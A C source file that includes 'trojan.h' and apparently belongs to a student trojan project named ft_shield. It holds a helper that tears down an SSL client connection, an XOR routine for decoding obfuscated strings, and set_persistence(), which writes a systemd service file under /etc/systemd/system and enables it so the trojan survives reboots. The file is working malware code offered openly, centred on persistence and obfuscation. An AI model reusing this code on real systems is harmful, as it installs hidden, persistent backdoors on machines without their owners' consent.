#include "trojan.h"

void ft_shutdown(t_args *args) {
    SSL_shutdown(args->ssl);
    SSL_free(args->ssl);
    close(args->client_socket);
    free(args);
}


void decode(int *data, char *decoded, int key, int n) {
    memset(decoded, 0, 50);
    for (int i = 0; i < n; i++) {
        decoded[i] = data[i] ^ key;
    }
}

void set_persistence() {
    const char *path = "/etc/systemd/system/ft_shield.service";
    int fd = sc(SYS_open ,path, O_CREAT | O_RDWR, 0644);
    if (fd < 0) {
        perror("open : ");
        return ;
    } else {
        write(1, "service file created\n", 22);
    }
    sc(SYS_write, fd, SYSTEMCTL_CONFIG, strlen(SYSTEMCTL_CONFIG));

    system("systemctl daemon-reexec");
    system("systemctl enable /etc/systemd/system/ft_shield.service");
    close(fd);
}